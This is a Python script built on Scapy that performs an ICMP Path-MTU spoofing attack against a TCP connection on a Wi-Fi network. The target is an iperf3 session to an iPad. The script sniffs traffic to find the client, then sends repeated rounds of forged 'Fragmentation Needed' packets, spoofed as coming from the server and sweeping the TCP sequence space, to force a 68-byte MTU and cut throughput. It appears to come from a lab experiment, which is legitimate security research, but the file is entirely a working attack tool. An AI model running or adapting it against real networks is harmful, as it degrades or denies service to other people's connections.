#!/usr/bin/env python3

import struct
import sys
import time

from scapy.all import IP, TCP, Raw, send, sniff, conf, checksum

from pathlib import Path
sys.path.append(str(Path(__file__).resolve().parent.parent))
from colored_text import *


# DEFAULT_SERVER_IP = "192.168.0.102"  
DEFAULT_SERVER_IP="10.249.138.192"
SERVER_PORT = 5201

ASSUMED_WINDOW = 2_600_000

SEQ_SPACE = 2 ** 32
NUM_GUESSES = max(1, SEQ_SPACE // ASSUMED_WINDOW)


if len(sys.argv) < 2:
    print(
        red(
            "Usage: sudo python3 attack2_pmtu_wifi.py "
            "<client_port> [duration_s] [target_mtu] "
            "[interval_s] [client_ip] [server_ip]"
        )
    )

    print(
        "    client_ip defaults to auto-detection by sniffing "
        "traffic to the iPad."
    )

    sys.exit(1)


CLIENT_PORT = int(sys.argv[1])
DURATION = int(sys.argv[2]) if len(sys.argv) > 2 else 120
TARGET_MTU = int(sys.argv[3]) if len(sys.argv) > 3 else 68
INTERVAL = float(sys.argv[4]) if len(sys.argv) > 4 else 2.0
CLIENT_IP = sys.argv[5] if len(sys.argv) > 5 else None
SERVER_IP = sys.argv[6] if len(sys.argv) > 6 else DEFAULT_SERVER_IP


def detect_client_ip(server_ip, server_port, timeout=20):

    print(
        yellow(
            f"⦿ Client IP not given - sniffing for traffic to "
            f"{server_ip}:{server_port}..."
        )
    )

    print(
        "    Make sure the iperf3 transfer is actively running."
    )

    packets = sniff(
        filter=f"host {server_ip} and tcp port {server_port}",
        count=1,
        timeout=timeout,
    )

    if not packets:
        raise RuntimeError(
            f"No traffic to {server_ip}:{server_port} seen within "
            f"{timeout}s. Pass the client's IP as the 5th argument."
        )

    pkt_ip = packets[0][IP]

    client_ip = (
        pkt_ip.src
        if pkt_ip.dst == server_ip
        else pkt_ip.dst
    )

    print(
        cyan(f"⦿ Detected client IP = {client_ip}")
    )

    return client_ip


if CLIENT_IP is None:
    CLIENT_IP = detect_client_ip(SERVER_IP, SERVER_PORT)


print(yellow("⦿ Attack configuration:"))
print("    Client       :", CLIENT_IP)
print("    Server       :", SERVER_IP, "(iPad)")
print("    Client port  :", CLIENT_PORT)
print("    Server port  :", SERVER_PORT)
print("    Target MTU   :", TARGET_MTU)
print("    Duration     :", f"{DURATION}s")
print("    Interval     :", f"{INTERVAL}s")
print("    Guesses/round:", NUM_GUESSES)

print(
    pink(
        f"⦿ Forged Path-MTU: {TARGET_MTU} bytes"
    )
)


route = conf.route.route(CLIENT_IP)

print(yellow("⦿ Route to client:"))
print("    interface :", route[0])
print("    gateway   :", route[2])
print("    source    :", route[1])


if route[0] == "lo":
    raise RuntimeError(
        "Scapy is routing the attack through loopback. "
        "Make sure this script is running on the attacker machine."
    )


def build_packet(seq):

    # Packet that appears to come from the client.
    offending = (
        IP(
            src=CLIENT_IP,
            dst=SERVER_IP,
            proto=6
        )
        /
        TCP(
            sport=CLIENT_PORT,
            dport=SERVER_PORT,
            flags="A",
            seq=seq,
            ack=0
        )
    )

    offending_bytes = bytes(offending)

    # Build the ICMP Fragmentation-Needed message.
    icmp_hdr = struct.pack(
        "!BBHHH",
        3,              # Type 3: Destination Unreachable
        4,              # Code 4: Fragmentation Needed
        0,
        0,
        TARGET_MTU
    )

    icmp_body = icmp_hdr + offending_bytes

    csum = checksum(icmp_body)

    icmp_hdr = struct.pack(
        "!BBHHH",
        3,
        4,
        csum,
        0,
        TARGET_MTU
    )

    icmp_body = icmp_hdr + offending_bytes

    # ICMP error that appears to come from the server.
    return (
        IP(
            src=SERVER_IP,
            dst=CLIENT_IP,
            proto=1
        )
        /
        Raw(load=icmp_body)
    )


def build_round():

    return [
        build_packet(
            (i * ASSUMED_WINDOW) % SEQ_SPACE
        )
        for i in range(NUM_GUESSES)
    ]


print(
    yellow(
        f"⦿ Sending {NUM_GUESSES}-packet seq-sweep rounds "
        f"every {INTERVAL}s for {DURATION}s..."
    )
)


t_start = time.time()

rounds = 0
sent = 0


try:

    while time.time() - t_start < DURATION:

        send(
            build_round(),
            verbose=False
        )

        rounds += 1
        sent += NUM_GUESSES

        print(
            cyan(
                f"⦿ Round {rounds}: sent "
                f"{NUM_GUESSES} forged PMTU={TARGET_MTU}B packets."
            )
        )

        time.sleep(INTERVAL)


except KeyboardInterrupt:

    print(
        yellow("\n⦿ Stopped by Ctrl-C.")
    )


elapsed = time.time() - t_start


print(
    cyan(
        f"⦿ Sent {sent} packets across "
        f"{rounds} rounds over {elapsed:.1f}s."
    )
)

print(
    green(
        "⦿ Attack finished."
    )
)

print(
    "    Check the client terminal for the PMTU/MSS "
    "snapshots and throughput reduction %."
)

sys.exit(0)